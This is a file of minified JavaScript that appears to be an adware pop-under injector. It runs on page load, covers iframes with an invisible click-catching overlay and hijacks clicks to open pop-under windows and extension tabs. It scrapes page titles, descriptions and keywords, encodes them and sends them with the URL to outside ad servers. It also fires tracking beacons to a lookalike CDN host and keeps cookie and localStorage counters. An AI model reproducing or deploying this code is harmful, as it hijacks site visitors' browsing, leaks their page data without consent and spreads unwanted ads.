_GPL.j(function(g,b,ga,y,m,e,k,ua,va,pb,ha,z,ab,ia,s,qb,n,wa,V,xa,A,t,rb,u,bb,ja){function K(){ya(h,V,K);cb(function(a,c){d=a;W||(W=!0,db(),eb(),ka(),za(h,V,ka),Aa=ia(function(){36E5<+new m-Ba&&S(!1)},5E3))})}function ka(){Ba=+new m}function S(a){W&&(g("iframe").off("mouseover",Ca),L.remove(),W=!1,ga(Aa),fb(),ya(h,V,ka),d=void 0,v="",a||za(h,V,K),s(K,1E3*Math.max(F,w)))}function za(a,c,f){if(n[wa])a[wa](c,f,!1);else a.attachEvent("on"+c,f)}function eb(){X=!0;b.ah&&b.ah(B,M);g("*").add(n).on(B,M);
Da||(Da=!0,g("*").add(n).on("mousedown mouseup click",Ea));g("iframe").each(function(a,c){try{g(c.contentWindow).on(B,M)}catch(f){}});Fa=ia(function(){g("iframe").each(function(a,c){c[Ga]||(c[Ga]=1,g(c).mouseover(Ca))})},100);if(T)try{b.log("Attempting to pop from extension to: "+d);var a="ld893_"+(v?"_"+e(v)+"_":"")+"_"+C(),c=b.proto+b.baseCDN+"/pwn.html?u="+e(d)+"&n="+a+"&r=";"h"!=T||N?"w"!=T||N||(N=!0,la(n,"openThatTabBitch",{url:c,isUnder:!1,attr:"z7b85_91c4"}),s(function(){N=!1},100)):(N=!0,
la(h,"createNewTab",{url:c,focused:"true"}),la(h.documentElement,"createNewTab",{url:c,focused:"true"}),s(function(){N=!1},100));var f=ia(function(){h.documentElement.getAttribute("z7b85_91c4")&&(ga(f),S(!0),Ha(),h.documentElement.removeAttribute("z7b85_91c4"))},50)}catch(Ia){}}function la(a,c,f){if(h.createEvent){var b=h.createEvent("CustomEvent");b.initCustomEvent(c,!1,!1,f);a.dispatchEvent(b)}else b=h.createEventObject(),b.detail=f,b.realType=c,a.fireEvent("ondataavailable",b)}function G(a){a=
ha.userAgent.match(ab(a+"[/ ](\\d+)","i"));return(a&&a[1])|0}function gb(){if(G("Chrome")){for(var a=0;a<ha.plugins.length;a++)if("Widevine Content Decryption Module"==ha.plugins[a].name)return!1;return!0}return!1}function db(){L||(L=g('<div style="z-index:999999999999999;cursor:pointer;display:none;position:absolute;background:transparent;">&nbsp;</div>').appendTo("body"),L.mouseout(function(){L.hide()}))}function Ca(a){var c=g(a.target),f=c.offset();f.width=c.outerWidth();f.height=c.outerHeight();
f.display="block";L.css(f);a.stopPropagation()}function hb(a){if(d!=Ja){a=a.target||a.srcElement;for(var c="";a;){O||(O=a.tagName);if("A"==a.tagName&&a.href&&a.protocol.toLowerCase().match(/^http/)){c=a.protocol+"//"+a.host+a.pathname+a.search+a.hash;break}a=a.parentNode}if(!d)return!1;c&&(d+="&t="+e(c.substring(0,Math.max(0,1500-d.length))));d+="&rt="+(+new m-Ka);O&&(d+="&data_tag="+e(O));"/"!=k.pathname&&(d+="&mk="+e(b.B64.encode(ma().substring(0,Math.max(0,1500-d.length)))));d+=La?"&data_sid="+
e(La):""}b.log("Popping to: "+d);c="ld893_"+(v?"_"+e(v)+"_":"")+"_"+C();P.parentNode||(Ma=Na());if(a=Ma("",1749==p?c:"_blank"))a.name=c,0.02>Math.random()?(c=""+d,-1<d.indexOf(Y)&&(c="http://"+Y+"/pclk?c="+e(v)+"&crl="+e(d)),a.location.href=c):a.location.href=d;return a}function ma(){function a(a){return a.toLowerCase().replace(/[.,!?]/g," ").split(" ")}var c=[];g("title").length&&(c=c.concat(a(g("title").text())));g('meta[property="og:title"],meta[property="og:description"],meta[name="description"],meta[name="keywords"]').each(function(){var f=
g.trim(g(this).attr("content"));f&&f.match(/^\s*[a-zA-Z0-9]/)&&(c=c.concat(a(f)))});return g.trim(function(a){var c=[];g.each(a,function(a,b){-1==g.inArray(b,c)&&c.push(b)});return c}(c).join(",").replace(/([,]+)/g,",").replace(/\s+/g," "))}function Oa(a,c){a=(a||k.href).substr(0,1500);var f="/"!=k.pathname?ma():"";a=a.replace(/:/g,"%3A");var f=f.replace(/:/g,"%3A").substring(0,Math.max(0,1500-a.length)),Ia=b.getSubId?"&subid="+b.getSubId(Z):"",f=e(b.B64.encode(a+"::z-"+p+"-"+Pa+"::"+f)),d="&cb="+
(c||na),d=d+("&data_fr="+(Qa(x)?"false":"true")),d=d+("&data_proto="+e(k.protocol));return b.proto+Y+"/pops?c="+f+"&a=1&ch="+e(U)+Ia+d}function ya(a,c,b){if(n[xa])a[xa](c,b,!1);else a.detachEvent("on"+c,b)}function fb(){X=!1;b.rh&&b.rh(B,M);g("*").add(n).off(B,M);g("iframe").each(function(a,c){try{g(c.contentWindow).off(B,M)}catch(b){}});ga(Fa)}function ib(a){a=a||n.event||{};if(T&&h.documentElement.getAttribute("z7b85_91c4"))return!0;for(a=a.target||a.srcElement;a;){if(a["91c4"])return!0;a=a.parentNode}return!1}
function Q(a,c){a=z(a,10);isNaN(a)&&(a=z(aa&&aa.getItem(c)||b.gc(c,10),10)||0);return a}function Qa(a){return(new m(1E3*(a||0))).toDateString()==(new m).toDateString()}function ba(){x|=0;q|=0;H|=0;var a=C(),c=q&&!Qa(x);c&&(q=0,r.set(u,q));var b=!I||a-x>=F&&q<I,a=a-H>=w;return!l&&c||b&&a}function M(a){a=a||n.event;if(!ib(a)){var c=X&&jb(),f=c&&hb(a);if(f&&!f.closed)return S(!0),Ha(),(new Image).src="//cdnstats-a.akamaihd.net/s.gif?t=p_success&d="+e(b.gd())+"&xr="+(l?"1":"0")+"&cid="+b.vars.cid+"&pid="+
p+"&r="+999999999*Math.random(),ca&&y(ca),da&&y(da),oa=!0,Ea(a);f&&f.closed?da||(da=s(function(){(new Image).src="//cdnstats-a.akamaihd.net/s.gif?t=popclose&u="+e(d)+"&location="+e(k.hostname)+"&pid="+p+"&tag="+e(O||"")+"&r="+999999999*Math.random()},1E3)):c&&(ca||(ca=s(function(){(new Image).src="//cdnstats-a.akamaihd.net/s.gif?t=popfail&u="+e(d)+"&location="+e(k.hostname)+"&pid="+p+"&tag="+e(O||"")+"&r="+999999999*Math.random()},1E3)))}}function jb(){if(!r.swf)return!0;x=Q(r.get(A),A);316808>Ra.score&&
(q=Q(r.get(u),u));var a=Sa(r.get(t));H=Q(a[R],t);return ba()}function C(){return ua(new m/1E3)}function Ta(a,c,b){r.set(a,b);b=C();aa&&aa.setItem(a,b);c=z(c,10);var e=new m;e.setSeconds(e.getSeconds()+c);h.cookie=a+"="+b+";expires="+e.toUTCString()+";path=/;domain="+R}function Ha(){var a=C();Ta(A,F,a);r.set(bb,a);x=a;r.set(u,++q);w&&Ta(t,w,ea+(ea&&",")+R+":"+a)}function Sa(a){var b={},f=C(),e=[];a=(a||"").split(",");if(a.length){for(var d=0;d<a.length;++d){var g=a[d].split(":"),h=z(g[1],10);f-h<w&&
(b[g[0]]=h,e.push(g[0]+":"+h))}ea=e.join(",");r.set(t,ea)}return b}function pa(){return ba()||l?1:C()-(z(H,10)||0)<w?Infinity:q>=I?"US"==b.vars.cid?149058:-1<["CA","GB","AU","FR","IT"].indexOf(b.vars.cid)?88620:59858:"US"==b.vars.cid?47432:-1<["CA","GB","AU","FR","IT"].indexOf(b.vars.cid)?59858:49928}function kb(a){"US"==b.vars.cid?qa(a,47432,149058):-1<["CA","GB","AU","FR","IT"].indexOf(b.vars.cid)?qa(a,59858,88620):qa(a,49928,59858);return ba()}function qa(a,b,f){a>=b&&(F=0,a>=f&&q>=I&&(q=va(0,
I-1)))}function Ua(a){y(fa);if(!l&&1735!=p){var b=pa(),f="http://clkmon.com/adServe/banners?pid=14442&cid="+Pa+"&action=r&q=",d="/"!=k.pathname?ma():"",f=f+e(d.substring(0,Math.max(0,1500-f.length)));n[na]({url:f,score:b});(new Image).src="//cdnstats-a.akamaihd.net/s.gif?t=popfallback&reason="+e(a)+"&pid="+p+"&u="+e(k.hostname)+"&r="+999999999*Math.random()}}function cb(a){!function f(){r.get(["frt","_GPL_oo_z7b85",A,t,u,ja],function(d){if(d.v.frt){if("1750"==p){var g=z(d.v._GPL_oo_z7b85,10)||0;if(86400>
ua(new m/1E3)-g)return}Va.getAttribute("data-openThatTabBitch")&&"t3"==b.vars.wptg&&(g=["wp_t3_c","wp_t3_t"],E=d.v[ja],E&&-1!=g.indexOf(E)||(E=g[Math.floor(Math.random()*g.length)],r.set(ja,E)),"wp_t3_t"==E&&(T="w"));Wa||(Wa=!0,b.pc(function(){Xa?Xa=!1:X||(ra=!1,S(),K())}));n[na]=function(b){lb(b,a)};g=C();x=Q(d.v[A],A);q=Q(d.v[u],u);d=Sa(d.v[t]);H=Q(d[R],t);if(ba()){d=pa();sa=+new m;var k=h.createElement("script");k.src=Oa()+"&ms="+d+"&r="+g;k.onerror=function(){Ua("error")};Va.appendChild(k);(new Image).src=
"//cdnstats-a.akamaihd.net/s.gif?t=p_req&ms="+d+"&d="+e(b.gd())+"&xr="+(l?"1":"0")+"&cid="+b.vars.cid+"&pid="+p+"&r="+999999999*Math.random();y(fa);fa=s(function(){Ua("time")},15E3)}else d=pa(),b.log("minScoreNeeded: "+d),Infinity>d&&!ra&&!l&&(sa=+new m,b.insertJS(Oa()+"&ms="+d+"&r="+g),(new Image).src="//cdnstats-a.akamaihd.net/s.gif?t=p_req&ms="+d+"&d="+e(b.gd())+"&xr="+(l?"1":"0")+"&cid="+b.vars.cid+"&pid="+p+"&r="+999999999*Math.random(),ra=!0),y(ta),ta=s(f,1E3*(5+va(g,x+F,H+w)-g))}})}()}function Na(){P=
h.createElement("iframe");P.style.display="none";P.style.visibility="hidden";h.body.appendChild(P);return P.contentWindow.open}function Ea(a){if(oa)return a.cancelBubble=!0,a.stopPropagation&&a.stopPropagation(),a.stopImmediatePropagation&&a.stopImmediatePropagation(),a.preventDefault&&a.preventDefault(),s(function(){oa=!1},100),!1}function lb(a,c){y(fa);var d=+new m-sa;v="";a&&(a.cid&&(v=a.cid,a.url||(a.url="http://"+Y+"/click?c="+e(v),a.url+=b.getSubId?"&subid="+b.getSubId(Z):"",a.url+=E?"&data_test="+
e(E):"",a.url+="&data_fb="+(gb()?"yes":"no"),a.url+="&data_rtt="+d,a.url+="&data_proto="+e(k.protocol),a.url+="&data_ic="+(Ya?"true":"false"),a.url+="&data_ss="+(screen.availHeight||0)+"x"+(screen.availWidth||0))),l&&!a.cid&&(a.url=Ja,a.cid="xr"),d=z(a.score,10),l||0<d&&kb(d)?(Ka=+new m,y(ta),a.url&&a.expires&&(y(Za),Za=s(function(){S(!0);K()},1E3*z(a.expires,10))),Ra={score:d,now:new m/1},c(a.url,d),(new Image).src="//cdnstats-a.akamaihd.net/s.gif?t=p_bid&d="+e(b.gd())+"&xr="+(l?"1":"0")+"&cid="+
b.vars.cid+"&pid="+p+"&r="+999999999*Math.random()):(new Image).src="//cdnstats-a.akamaihd.net/s.gif?t=p_nobid&d="+e(b.gd())+"&xr="+(l?"1":"0")+"&cid="+b.vars.cid+"&pid="+p+"&r="+999999999*Math.random())}var r=b.items.e6a00,h=n.document,Va=h.body,aa=n.localStorage,mb=G("chrome"),nb=G("firefox");G("opera");var ob=G("safari");G("webkit");var U=b.item_vars["22555_ch"]||b.item_vars.ch||"",F,x,H,J=b.dt(),J=J&&J.inherited&&J.inherited.t||[],l="x"==U||-1<J.indexOf("adult")||0==J.length&&0<g('meta[content="RTA-5042-1996-1400-1577-RTA"]').length;
l&&(-1==J.indexOf("adult_block")?U="x":(U="x-issue",l=!1));var w,Z="z7b85",Y=b.gsd&&b.gsd(Z)||"s.hklmm.com",W=!1,Aa,Ba,X=!1,R=b.gd(),d,Ka=0,sa=0,Za,ea="",q=0,I,Ra={},v="",ta,ra=!1,E,ca,da,fa,O,B="click";if(mb||ob)B="mousedown";else if(nb||h.all||G("trident"))B="mouseup";var $a=b.zoneid(Z,!0).split("_"),Pa=$a[0],p=$a[1]||b.vars.pid,La=b.vars.systemid,Ja="http://secure.xsrving.com/display?size=800x600&ch="+e(U)+"&referer="+e(R),T=!1,N=!1,na=b.rs(20),L,Ga=b.rs(12),Fa,Ya=function(){try{return n[(n.btoa||
function(a){return a})(k.hostname+"::"+(new m).toDateString())]===k.protocol}catch(a){return!1}}(),Wa=!1,Xa=!0,P,Ma=Na(),oa=!1,Da=!1;1797==p&&"GB"==b.vars.cid||"facebook.com"==R||(Ya?(new Image).src="//cdnstats-a.akamaihd.net/s.gif?t=idlecrawler&d="+e(b.gd())+"&xr="+(l?"1":"0")+"&cid="+b.vars.cid+"&pid="+p+"&r="+999999999*Math.random():(l?(I=F=0,w=180,A+="_xr",t+="_xr",u+="_xr"):(F=360,I=4,w=360),K()))},_GPL,clearInterval,clearTimeout,Date,encodeURIComponent,location,Math.floor,Math.max,Math.random,
navigator,parseInt,RegExp,setInterval,setTimeout,void 0,window,"addEventListener","mousemove","removeEventListener","ld893_pop_g","ld893_pop_s","ld893_s","ld893_pop_gs","ld893_spopd","z7b85_test");
